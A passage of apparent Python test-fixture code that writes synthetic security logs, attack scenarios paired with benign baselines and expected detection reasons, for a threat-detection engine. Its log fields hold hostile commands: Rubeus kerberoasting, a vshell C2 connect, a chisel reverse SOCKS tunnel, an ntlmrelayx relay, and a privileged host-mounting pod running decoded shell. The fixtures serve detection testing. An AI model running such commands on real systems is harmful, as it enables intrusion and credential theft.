                "surface": "endpoint",
                "process": "bash",
                "parent_process": "sshd",
                "command_line": cmd,
                "status_code": 0,
            }
        )
        cur += timedelta(seconds=10.0)
    p = _write_jsonl(base_dir / "scenario_zero_ioc_redundant_worker_and_idioms.jsonl", zero_ioc_idioms)
    manifest["scenario_zero_ioc_redundant_worker_and_idioms"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "endpoint",
        "zero_ioc": True,
        "expected_reasons": ["multi_worker_redundant_recon", "llm_cli_context_idioms"],
    }

    # Scenario 11: Zero-IOC FoxIO JA4/JA4H Client Stack Whiplash under Spoofed Chrome UA
    zero_ioc_ja4: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=11)
    spoofed_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
    for path, ja4, ja4h in [
        ("/login", "t13d1516h2_8daaf6152771_e5627efa2ab1", "ge11cn20enus_60a1c1a3a9d9_000000000000_000000000000"),
        ("/dashboard", "t13d190900_9dc949149365_97f8aa674fd9", "ge11nn040000_a3b8c9d0e1f2_000000000000_000000000000"),
        ("/api/v1/items", "t13d3112h2_e8f1e7e78f70_414c70412362", "ge11nn060000_112233445566_000000000000_000000000000"),
        ("/api/v1/profile", "t13d201300_2b729b4bf6f3_9e7b989ebec8", "ge11nn030000_778899aabbcc_000000000000_000000000000"),
        ("/reports/monthly", "t13d190900_9dc949149365_97f8aa674fd9", "ge11nn040000_a3b8c9d0e1f2_000000000000_000000000000"),
        ("/settings/profile", "t13d1516h2_8daaf6152771_e5627efa2ab1", "ge11cn20enus_60a1c1a3a9d9_000000000000_000000000000"),
    ]:
        zero_ioc_ja4.append(
            {
                "timestamp": _iso(cur),
                "source_host": "198.51.100.201",
                "actor": "198.51.100.201",
                "event_type": "http",
                "surface": "web_portal",
                "dest_host": "portal.corp.local",
                "dest_port": 443,
                "http_method": "GET",
                "http_path": path,
                "user_agent": spoofed_ua,
                "ja4": ja4,
                "ja4h": ja4h,
                "status_code": 200,
            }
        )
        cur += timedelta(seconds=8.0)
    p = _write_jsonl(base_dir / "scenario_zero_ioc_ja4_whiplash.jsonl", zero_ioc_ja4)
    manifest["scenario_zero_ioc_ja4_whiplash"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "web_portal",
        "zero_ioc": True,
        "expected_reasons": ["ja4_client_stack_whiplash"],
    }

    # Scenario 12: Zero-IOC Touch-and-Bail Generic Process-List Sweep Across 5 Hosts
    zero_ioc_touch_bail: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=12)
    for host, cmd in [
        ("srv-app-01", "tasklist"),
        ("srv-app-02", "ps aux"),
        ("srv-app-03", "tasklist"),
        ("srv-app-04", "ps -ef"),
        ("srv-app-05", "get-process"),
    ]:
        zero_ioc_touch_bail.append(
            {
                "timestamp": _iso(cur),
                "source_host": "jump-ops-03",
                "actor": "svc-backup",
                "event_type": "process",
                "surface": "endpoint",
                "dest_host": host,
                "process": "ssh",
                "parent_process": "bash",
                "command_line": cmd,
                "status_code": 0,
            }
        )
        cur += timedelta(seconds=8.0)
    p = _write_jsonl(base_dir / "scenario_zero_ioc_touch_and_bail_edr.jsonl", zero_ioc_touch_bail)
    manifest["scenario_zero_ioc_touch_and_bail_edr"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "endpoint",
        "zero_ioc": True,
        "expected_reasons": ["touch_and_bail_edr_evasion"],
    }

    # Scenario 13: Post-Exploitation AD Credential Dumping + ARTEX Follow-On C2 (vshell / AdaptixC2 / sqlserver-sqlite.com)
    post_ad_c2: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=13)
    post_ad_c2.extend(
        [
            {
                "timestamp": _iso(cur),
                "source_host": "srv-sql-04",
                "actor": "svc-sql",
                "event_type": "process",
                "surface": "endpoint",
                "process": "Rubeus.exe",
                "parent_process": "cmd.exe",
                "command_line": "Rubeus.exe kerberoast /nowrap",
                "status_code": 0,
            },
            {
                "timestamp": _iso(cur + timedelta(seconds=6)),
                "source_host": "srv-sql-04",
                "actor": "svc-sql",
                "event_type": "process",
                "surface": "endpoint",
                "process": "vshell.exe",
                "parent_process": "services.exe",
                "command_line": "vshell.exe --connect sqlserver-sqlite.com",
                "dest_host": "sqlserver-sqlite.com",
                "dest_port": 443,
                "status_code": 200,
            },
        ]
    )
    p = _write_jsonl(base_dir / "scenario_post_exploit_ad_and_followon_c2.jsonl", post_ad_c2)
    manifest["scenario_post_exploit_ad_and_followon_c2"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "endpoint",
        "expected_reasons": ["post_exploit_ad_or_followon_c2"],
    }

    # Scenario 14: Okta Legacy /api/v1/authn Password Spray -> Success -> 2FA Push Bombing -> Rogue Factor Enrollment
    okta_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=14)
    attacker_ip = "203.0.113.245"
    for user in [
        "jchen@corp.local",
        "mlee@corp.local",
        "rpatel@corp.local",
        "agarcia@corp.local",
        "ksmith@corp.local",
        "tnguyen@corp.local",
    ]:
        okta_attack.append(
            {
                "published": _iso(cur),
                "eventType": "user.session.start",
                "actor": {"alternateId": user},
                "client": {"ipAddress": attacker_ip, "userAgent": {"rawUserAgent": "Mozilla/5.0 Chrome/131.0"}},
                "outcome": {"result": "FAILURE", "reason": "INVALID_CREDENTIALS"},
                "debugContext": {"debugData": {"requestUri": "/api/v1/authn"}},
                "target": [{"displayName": "Okta SSO"}],
            }
        )
        cur += timedelta(seconds=1.1)
    # Lands valid password on 7th account, then bombs 2FA push notifications and enrolls a rogue factor
    victim = "sbarnes@corp.local"
    okta_attack.append(
        {
            "published": _iso(cur),
            "eventType": "user.session.start",
            "actor": {"alternateId": victim},
            "client": {"ipAddress": attacker_ip, "userAgent": {"rawUserAgent": "Mozilla/5.0 Chrome/131.0"}},
            "outcome": {"result": "SUCCESS", "reason": ""},
            "debugContext": {"debugData": {"requestUri": "/api/v1/authn"}},
            "target": [{"displayName": "Okta SSO"}],
        }
    )
    for _ in range(4):
        cur += timedelta(seconds=3.0)
        okta_attack.append(
            {
                "published": _iso(cur),
                "eventType": "user.mfa.okta_verify.deny_push",
                "actor": {"alternateId": victim},
                "client": {"ipAddress": attacker_ip, "userAgent": {"rawUserAgent": "Mozilla/5.0 Chrome/131.0"}},
                "outcome": {"result": "FAILURE", "reason": "VERIFICATION_ERROR"},
                "debugContext": {"debugData": {"requestUri": "/api/v1/authn/factors/verify"}},
                "target": [{"displayName": "Okta Verify"}],
            }
        )
    cur += timedelta(seconds=6.0)
    okta_attack.append(
        {
            "published": _iso(cur),
            "eventType": "user.mfa.factor.activate",
            "actor": {"alternateId": victim},
            "client": {"ipAddress": attacker_ip, "userAgent": {"rawUserAgent": "Mozilla/5.0 Chrome/131.0"}},
            "outcome": {"result": "SUCCESS", "reason": ""},
            "debugContext": {"debugData": {"requestUri": "/api/v1/users/me/factors"}},
            "target": [{"displayName": "Google Authenticator"}],
        }
    )
    p = _write_jsonl(base_dir / "scenario_okta_spray_and_mfa_fatigue_tampering.jsonl", okta_attack)
    manifest["scenario_okta_spray_and_mfa_fatigue_tampering"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": ["idp_spray_then_success", "idp_mfa_fatigue_or_2fa_tampering"],
    }

    # Scenario 15: Entra ID Service Principal Secret Guessing (7000215 -> 0) + 5-Resource Fan-Out (Storm-0940)
    entra_attack: list[dict[str, Any]] = []
    cur = t0 + timedelta(hours=15)
    sp_ip = "198.51.100.249"
    for _ in range(3):
        entra_attack.append(
            {
                "createdDateTime": _iso(cur),
                "ipAddress": sp_ip,
                "servicePrincipalName": "sp-connectwise-backup",
                "resourceDisplayName": "Microsoft Graph",
                "isInteractive": False,
                "status": {"errorCode": 7000215, "failureReason": "Invalid client secret provided"},
            }
        )
        cur += timedelta(seconds=2.0)
    for res_name in [
        "Microsoft Graph",
        "Azure Key Vault",
        "Office 365 Exchange Online",
        "Office 365 SharePoint Online",
        "Windows Azure Service Management API",
    ]:
        cur += timedelta(seconds=3.0)
        entra_attack.append(
            {
                "createdDateTime": _iso(cur),
                "ipAddress": sp_ip,
                "servicePrincipalName": "sp-connectwise-backup",
                "resourceDisplayName": res_name,
                "isInteractive": False,
                "status": {"errorCode": 0, "failureReason": ""},
            }
        )
    p = _write_jsonl(base_dir / "scenario_entra_sp_secret_guess_and_fanout.jsonl", entra_attack)
    manifest["scenario_entra_sp_secret_guess_and_fanout"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": ["idp_sp_secret_guess_then_success", "idp_sp_multi_resource_fanout"],
    }

    # Baseline 14: Normal Duo Security, PingFederate, and Google Workspace logins
    cur = t0 + timedelta(hours=16)
    idp_multi_benign: list[dict[str, Any]] = [
        {
            "isotimestamp": _iso(cur),
            "txid": "duo-benign-1",
            "user": {"name": "alice@corp.local"},
            "access_device": {"ip": "198.51.100.31", "browser": "Chrome"},
            "application": {"name": "VPN"},
            "factor": "duo_push",
            "result": "success",
            "reason": "user_approved",
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=45)),
            "trackingid": "pf-benign-1",
            "adapterid": "HTMLFormAdapter",
            "event": "SSO",
            "ip": "198.51.100.32",
            "subject": "bob@corp.local",
            "app": "Workday",
            "status": "success",
            "description": "SSO completed",
        },
        {
            "kind": "admin#reports#activity",
            "id": {"time": _iso(cur + timedelta(seconds=90)), "applicationName": "login"},
            "actor": {"email": "carol@corp.local"},
            "ipAddress": "198.51.100.33",
            "events": [{"type": "login", "name": "login_success", "parameters": [{"name": "is_suspicious", "boolValue": False}]}],
        },
    ]
    p = _write_jsonl(base_dir / "baseline_duo_ping_gws_normal.jsonl", idp_multi_benign)
    manifest["baseline_duo_ping_gws_normal"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [],
    }

    # Scenario 16: Duo Push Bombing / Fraud Report + Google Workspace 2SV Disable + PingFederate Spray
    cur = t0 + timedelta(hours=17)
    idp_multi_attack: list[dict[str, Any]] = [
        {
            "isotimestamp": _iso(cur),
            "txid": "duo-atk-1",
            "user": {"name": "cfo@corp.local"},
            "access_device": {"ip": "203.0.113.247", "browser": "Chrome"},
            "application": {"name": "Corporate VPN"},
            "factor": "duo_push",
            "result": "fraud",
            "reason": "fraud_reported",
        },
        {
            "kind": "admin#reports#activity",
            "id": {"time": _iso(cur + timedelta(seconds=10)), "applicationName": "login"},
            "actor": {"email": "cfo@corp.local"},
            "ipAddress": "203.0.113.247",
            "events": [{"type": "account_warning", "name": "2sv_disable", "parameters": []}],
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=20)),
            "trackingid": "pf-atk-1",
            "adapterid": "PingIDAdapter",
            "event": "MFA",
            "ip": "203.0.113.247",
            "subject": "cfo@corp.local",
            "app": "FinanceSSO",
            "status": "failure",
            "description": "mfa_rejected",
        },
    ]
    p = _write_jsonl(base_dir / "scenario_duo_ping_gws_2fa_abuse.jsonl", idp_multi_attack)
    manifest["scenario_duo_ping_gws_2fa_abuse"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": ["idp_mfa_fatigue_or_2fa_tampering"],
    }

    # Baseline 15: Legitimate Microsoft Edge launch from Program Files + normal dev gcc build in /home/dev/repo
    cur = t0 + timedelta(hours=18)
    ad_pivot_benign: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur),
            "source_host": "wkstn-finance-04",
            "actor": "jdoe",
            "event_type": "process_create",
            "surface": "endpoint",
            "process": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            "parent_process": "explorer.exe",
            "command_line": r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default',
            "action": "process_create",
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=20)),
            "source_host": "laptop-dev-12",
            "actor": "devuser",
            "event_type": "process_create",
            "surface": "endpoint",
            "process": "gcc",
            "parent_process": "make",
            "command_line": "gcc -O2 /home/devuser/project/main.c -o /home/devuser/project/app",
            "action": "process_create",
        },
    ]
    p = _write_jsonl(base_dir / "baseline_edge_and_dev_build_normal.jsonl", ad_pivot_benign)
    manifest["baseline_edge_and_dev_build_normal"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "endpoint",
        "expected_reasons": [],
    }

    # Scenario 17: Internal AD Pivot Chain (Chisel SOCKS + NTLM Relay + Relocated Edge Sideload + /tmp C Compiler + CMS .phar/.htaccess)
    cur = t0 + timedelta(hours=19)
    ad_pivot_attack: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur),
            "source_host": "pivot-srv-03",
            "actor": "svc-web",
            "event_type": "process_create",
            "surface": "endpoint",
            "process": "chisel",
            "parent_process": "bash",
            "command_line": "./chisel client 198.51.100.240:8443 R:1081:socks",
            "action": "process_create",
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=8)),
            "source_host": "pivot-srv-03",
            "actor": "svc-web",
            "event_type": "process_create",
            "surface": "endpoint",
            "process": "python3",
            "parent_process": "bash",
            "command_line": "proxychains4 -f /tmp/pc1081.conf ntlmrelayx -t ldaps://dc01.corp.local -smb2support",
            "action": "process_create",
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=15)),
            "source_host": "pivot-srv-03",
            "actor": "svc-web",
            "event_type": "process_create",
            "surface": "endpoint",
            "process": "gcc",
            "parent_process": "bash",
            "command_line": "gcc -O3 /tmp/hash_worker.c -lcrypto -lpthread -o /tmp/hash_worker",
            "action": "process_create",
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=22)),
            "source_host": "pivot-srv-03",
            "actor": "svc-web",
            "event_type": "process_create",
            "surface": "endpoint",
            "process": r"C:\ProgramData\staging\edge.exe",
            "parent_process": "cmd.exe",
            "command_line": r"C:\ProgramData\staging\edge.exe -c C:\ProgramData\staging\config.bin",
            "action": "process_create",
        },
    ]
    p = _write_jsonl(base_dir / "scenario_ad_pivot_chisel_relay_sideload.jsonl", ad_pivot_attack)
    manifest["scenario_ad_pivot_chisel_relay_sideload"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "endpoint",
        "expected_reasons": [
            "socks_chisel_pivot_tunnel_mesh",
            "ad_ntlm_relay_or_ldap_kerb_enum",
            "on_box_compiler_in_staging_path",
            "dll_sideload_relocated_binary_with_config",
        ],
    }

    # Baseline 16: Benign single SSM GetParameter by Terraform automation in NATIVE AWS CloudTrail JSON (0 FPs)
    cur = t0 + timedelta(hours=20)
    aws_ssm_benign: list[dict[str, Any]] = [
        {
            "eventVersion": "1.09",
            "eventTime": _iso(cur),
            "eventSource": "ssm.amazonaws.com",
            "eventName": "GetParameter",
            "awsRegion": "us-east-1",
            "sourceIPAddress": "10.30.1.5",
            "userAgent": "HashiCorp Terraform/1.9.5 (+https://www.terraform.io)",
            "vpcEndpointId": "vpce-0123456789abcdef0",
            "userIdentity": {
                "type": "AssumedRole",
                "arn": "arn:aws:sts::111122223333:assumed-role/terraform-ci/plan-run",
            },
            "requestParameters": {"name": "/app/prod/region", "withDecryption": False},
        }
    ]
    p = _write_jsonl(base_dir / "baseline_aws_ssm_terraform_normal.jsonl", aws_ssm_benign)
    manifest["baseline_aws_ssm_terraform_normal"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [],
    }

    # Scenario 18: Elastic CyberStrikeAI CloudTrail Intrusion in NATIVE AWS CloudTrail JSON
    # (nested userIdentity.arn, camelCase userAgent, nested requestParameters)
    cur = t0 + timedelta(hours=21)
    cs_ip = "203.0.113.241"
    cyberstrike_aws: list[dict[str, Any]] = [
        {
            "eventVersion": "1.09",
            "eventTime": _iso(cur + timedelta(milliseconds=i * 20)),
            "eventSource": "ec2.amazonaws.com",
            "eventName": "DescribeInstanceAttribute",
            "awsRegion": "us-east-1",
            "sourceIPAddress": cs_ip,
            "userAgent": "Boto3/1.35.0 Python/3.12",
            "userIdentity": {
                "type": "AssumedRole",
                "arn": "arn:aws:sts::111122223333:assumed-role/WebServerRole/i-0a1b2c3d4e5f67890",
            },
            "requestParameters": {"attribute": "userData", "instanceId": f"i-0000{i:04x}"},
        }
        for i in range(4)
    ] + [
        {
            "eventVersion": "1.09",
            "eventTime": _iso(cur + timedelta(seconds=2)),
            "eventSource": "ssm.amazonaws.com",
            "eventName": "GetParametersByPath",
            "awsRegion": "us-east-1",
            "sourceIPAddress": cs_ip,
            "userAgent": "Boto3/1.35.0 Python/3.12",
            "userIdentity": {
                "type": "IAMUser",
                "arn": "arn:aws:iam::111122223333:user/svc-deploy",
            },
            "requestParameters": {"path": "/prod/", "withDecryption": True},
        },
        {
            "eventVersion": "1.09",
            "eventTime": _iso(cur + timedelta(seconds=4)),
            "eventSource": "ssm.amazonaws.com",
            "eventName": "SendCommand",
            "awsRegion": "us-east-1",
            "sourceIPAddress": cs_ip,
            "userAgent": "Boto3/1.35.0 Python/3.12",
            "userIdentity": {
                "type": "IAMUser",
                "arn": "arn:aws:iam::111122223333:user/svc-backup",
            },
            "requestParameters": {"documentName": "AWS-RunShellScript", "withDecryption": True},
        },
    ]
    p = _write_jsonl(base_dir / "scenario_cyberstrikeai_aws_userdata_ssm_multi_id.jsonl", cyberstrike_aws)
    manifest["scenario_cyberstrikeai_aws_userdata_ssm_multi_id"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [
            "cloud_ec2_userdata_or_ssm_burst",
            "cloud_ec2_role_external_replay",
            "cloud_multi_identity_from_single_ip",
        ],
    }

    # Baseline 17: Benign Kubernetes system DaemonSet in NATIVE unmodified `audit.k8s.io/v1` Event JSON -> 0 FPs
    cur = t0 + timedelta(hours=22)
    k8s_benign: list[dict[str, Any]] = [
        {
            "kind": "Event",
            "apiVersion": "audit.k8s.io/v1",
            "stage": "ResponseComplete",
            "requestReceivedTimestamp": _iso(cur),
            "stageTimestamp": _iso(cur),
            "verb": "create",
            "user": {"username": "system:serviceaccount:kube-system:daemon-set-controller"},
            "sourceIPs": ["10.40.0.5"],
            "userAgent": "kube-controller-manager/v1.31.0",
            "requestURI": "/api/v1/namespaces/kube-system/pods",
            "objectRef": {"resource": "pods", "namespace": "kube-system", "name": "kube-proxy-xyz"},
            "responseStatus": {"code": 201},
            "requestObject": {
                "kind": "Pod",
                "metadata": {"name": "kube-proxy-xyz"},
                "spec": {
                    "hostNetwork": True,
                    "containers": [
                        {
                            "name": "kube-proxy",
                            "image": "registry.k8s.io/kube-proxy:v1.31.0",
                            "securityContext": {"privileged": True},
                            "command": ["/usr/local/bin/kube-proxy", "--config=/var/lib/kube-proxy/config.conf"],
                        }
                    ],
                },
            },
        }
    ]
    p = _write_jsonl(base_dir / "baseline_k8s_daemonset_normal.jsonl", k8s_benign)
    manifest["baseline_k8s_daemonset_normal"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [],
    }

    # Scenario 19: Privileged Kubernetes Pod Staging in NATIVE unmodified `audit.k8s.io/v1` Event JSON
    cur = t0 + timedelta(hours=23)
    k8s_attack: list[dict[str, Any]] = [
        {
            "kind": "Event",
            "apiVersion": "audit.k8s.io/v1",
            "stage": "ResponseComplete",
            "requestReceivedTimestamp": _iso(cur),
            "stageTimestamp": _iso(cur),
            "verb": "create",
            "user": {"username": "compromised-deployer"},
            "sourceIPs": ["198.51.100.77"],
            "userAgent": "kubectl/v1.31.0",
            "requestURI": "/api/v1/namespaces/default/pods",
            "objectRef": {"resource": "pods", "namespace": "default", "name": "stage-worker-01"},
            "responseStatus": {"code": 201},
            "requestObject": {
                "kind": "Pod",
                "metadata": {"name": "stage-worker-01"},
                "spec": {
                    "hostPID": True,
                    "hostNetwork": True,
                    "volumes": [{"name": "host-root", "hostPath": {"path": "/"}}],
                    "containers": [
                        {
                            "name": "worker",
                            "image": "python:3.12-slim",
                            "securityContext": {"privileged": True},
                            "command": ["/bin/sh", "-c"],
                            "args": ["echo ZWNobyByZWxheQ== | base64 -d | sh"],
                        }
                    ],
                },
            },
        }
    ]
    p = _write_jsonl(base_dir / "scenario_k8s_privileged_pod_staging.jsonl", k8s_attack)
    manifest["scenario_k8s_privileged_pod_staging"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": ["k8s_privileged_pod_staging"],
    }

    # Baseline 18: Benign GCP microservice reading 2 secrets + GCS bucket with cloud-service words + Google-managed SAs -> 0 FPs
    cur = t0 + timedelta(hours=24)
    gcp_benign: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur),
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "secretmanager.googleapis.com",
                "methodName": "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion",
                "resourceName": "projects/111122223333/secrets/db-pass/versions/latest",
                "authenticationInfo": {"principalEmail": "svc-billing@prod-proj.iam.gserviceaccount.com"},
                "requestMetadata": {"callerIp": "198.51.100.110", "callerSuppliedUserAgent": "google-cloud-go/1.12.0"},
                "status": {"code": 0},
            },
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=25)),
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "secretmanager.googleapis.com",
                "methodName": "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion",
                "resourceName": "projects/111122223333/secrets/stripe-key/versions/latest",
                "authenticationInfo": {"principalEmail": "svc-billing@prod-proj.iam.gserviceaccount.com"},
                "requestMetadata": {"callerIp": "198.51.100.110", "callerSuppliedUserAgent": "google-cloud-go/1.12.0"},
                "status": {"code": 0},
            },
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=55)),
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "storage.googleapis.com",
                "methodName": "storage.objects.get",
                "resourceName": "projects/_/buckets/arm-compute-container-iam-storage-logs/objects/2026.log",
                "authenticationInfo": {"principalEmail": "svc-billing@prod-proj.iam.gserviceaccount.com"},
                "requestMetadata": {"callerIp": "198.51.100.110", "callerSuppliedUserAgent": "google-cloud-go/1.12.0"},
                "status": {"code": 0},
            },
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=85)),
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "cloudbuild.googleapis.com",
                "methodName": "google.devtools.cloudbuild.v1.CloudBuild.GetBuild",
                "resourceName": "projects/prod-proj/builds/abc",
                "authenticationInfo": {"principalEmail": "service-111122223333@gcp-sa-cloudbuild.iam.gserviceaccount.com"},
                "requestMetadata": {"callerIp": "198.51.100.110", "callerSuppliedUserAgent": "Google-Cloud-Build"},
                "status": {"code": 0},
            },
        },
    ]
    p = _write_jsonl(base_dir / "baseline_gcp_microservice_normal.jsonl", gcp_benign)
    manifest["baseline_gcp_microservice_normal"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [],
    }

    # Scenario 20: Bitrise ARTEX GCP Cloud Audit (native protoPayload) multi-SA pivot + PERMISSION_DENIED -> AccessSecretVersion + _i<N>_probe
    cur = t0 + timedelta(hours=25)
    gcp_atk_ip = "203.0.113.244"
    gcp_attack: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur + timedelta(seconds=idx * 1.2)),
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": svc,
                "methodName": meth,
                "resourceName": res,
                "authenticationInfo": {"principalEmail": sa},
                "requestMetadata": {"callerIp": gcp_atk_ip, "callerSuppliedUserAgent": "google-cloud-sdk gcloud/501.0.0"},
                "status": {"code": code, "message": msg},
            },
        }
        for idx, (svc, meth, res, sa, code, msg) in enumerate(
            [
                ("iam.googleapis.com", "google.iam.admin.v1.ListServiceAccounts", "projects/prod-proj", "111122223333-compute@developer.gserviceaccount.com", 7, "PERMISSION_DENIED"),
                ("compute.googleapis.com", "v1.compute.instances.list", "projects/prod-proj/zones/us-central1-a", "111122223333-compute@developer.gserviceaccount.com", 7, "PERMISSION_DENIED"),
                ("compute.googleapis.com", "v1.compute.instances.list", "projects/prod-proj/zones/us-central1-a", "ci-runner@prod-proj.iam.gserviceaccount.com", 7, "PERMISSION_DENIED"),
                ("storage.googleapis.com", "storage.buckets.list", "projects/prod-proj", "backup-sa@prod-proj.iam.gserviceaccount.com", 7, "PERMISSION_DENIED"),
                ("secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.ListSecrets", "projects/prod-proj", "111122223333-compute@developer.gserviceaccount.com", 7, "PERMISSION_DENIED"),
                ("secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion", "projects/prod-proj/secrets/prod-signing-key/versions/latest", "111122223333-compute@developer.gserviceaccount.com", 0, "OK"),
            ]
        )
    ] + [
        {
            "timestamp": _iso(cur + timedelta(seconds=9)),
            "source_host": gcp_atk_ip,
            "actor": "111122223333-compute@developer.gserviceaccount.com",
            "surface": "web_portal",
            "event_type": "http",
            "http_method": "GET",
            "http_path": "/_i0142_probe_auth",
            "status_code": 404,
            "user_agent": "python-httpx/0.28.1",
        }
    ]
    p = _write_jsonl(base_dir / "scenario_bitrise_gcp_multi_sa_secret_dump.jsonl", gcp_attack)
    manifest["scenario_bitrise_gcp_multi_sa_secret_dump"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [
            "cloud_multi_identity_from_single_ip",
            "cloud_secret_search_or_dryrun_burst",
            "unit42_agentic_canary_probe",
        ],
    }

    # Baseline 19: Benign Azure Key Vault startup (2 SecretGet 200s from 1 static IP) + single-/16 Entra SP -> 0 FPs
    cur = t0 + timedelta(hours=26)
    kv_benign: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur),
            "source_host": "198.51.100.120",
            "actor": "app-payments-sp",
            "surface": "cloud_iam",
            "appliance": "entra_id",
            "event_type": "idp_sp_auth",
            "dest_host": "Azure Key Vault",
            "action": "ServicePrincipalSignIn",
            "status_code": 200,
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=25)),
            "source_host": "198.51.100.120",
            "actor": "app-payments-sp",
            "surface": "cloud_iam",
            "event_type": "cloud_api",
            "dest_host": "prod-kv.vault.azure.net",
            "action": "SecretGet",
            "status_code": 200,
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=55)),
            "source_host": "198.51.100.120",
            "actor": "app-payments-sp",
            "surface": "cloud_iam",
            "event_type": "cloud_api",
            "dest_host": "prod-kv.vault.azure.net",
            "action": "SecretGet",
            "status_code": 200,
        },
    ]
    p = _write_jsonl(base_dir / "baseline_azure_keyvault_startup_normal.jsonl", kv_benign)
    manifest["baseline_azure_keyvault_startup_normal"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [],
    }

    # Scenario 21: Microsoft 2026-11-25 Storm-0940 zero-401 multi-/16 SP replay + <5m Azure Key Vault denied -> SecretGet dump
    cur = t0 + timedelta(hours=27)
    msft_kv_attack: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur + timedelta(seconds=i * 2)),
            "source_host": ip,
            "actor": "ConnectWise-Backup-Sync",
            "surface": "cloud_iam",
            "appliance": "entra_id",
            "event_type": "idp_sp_auth",
            "dest_host": res,
            "action": "ServicePrincipalSignIn",
            "status_code": 200,
        }
        for i, (ip, res) in enumerate(
            [
                ("203.0.113.91", "Microsoft Graph"),
                ("198.51.100.91", "SharePoint Online"),
                ("192.0.2.91", "Azure Key Vault"),
            ]
        )
    ] + [
        {
            "timestamp": _iso(cur + timedelta(seconds=10 + i)),
            "source_host": "192.0.2.91",
            "actor": "ConnectWise-Backup-Sync",
            "surface": "cloud_iam",
            "event_type": "cloud_api",
            "dest_host": "corp-prod-kv.vault.azure.net",
            "action": act,
            "status_code": code,
        }
        for i, (act, code) in enumerate(
            [
                ("VaultGet", 403),
                ("KeyList", 403),
                ("CertificateList", 403),
                ("SecretList", 200),
                ("SecretGet", 200),
                ("SecretGet", 200),
            ]
        )
    ]
    p = _write_jsonl(base_dir / "scenario_msft_storm0940_sp_replay_and_keyvault_dump.jsonl", msft_kv_attack)
    manifest["scenario_msft_storm0940_sp_replay_and_keyvault_dump"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "cloud_iam",
        "expected_reasons": [
            "idp_sp_multi_ip_replay",
            "cloud_secret_search_or_dryrun_burst",
        ],
    }

    # Baseline 20: Benign /function/workspace_docs & /workspaces/dev web requests -> 0 FPs
    cur = t0 + timedelta(hours=28)
    ws_benign: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur + timedelta(seconds=i * 30)),
            "source_host": "198.51.100.130",
            "actor": "dev-alice",
            "surface": "web_portal",
            "event_type": "http",
            "http_method": "GET",
            "http_path": path,
            "status_code": 200,
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/131.0.0.0",
        }
        for i, path in enumerate(["/function/workspace_docs", "/workspaces/dev", "/api/workspace/list"])
    ]
    p = _write_jsonl(base_dir / "baseline_web_workspace_and_dev_mitmproxy.jsonl", ws_benign)
    manifest["baseline_web_workspace_and_dev_mitmproxy"] = {
        "path": str(p),
        "expected_positive": False,
        "format": "jsonl",
        "surface": "web_portal",
        "expected_reasons": [],
    }

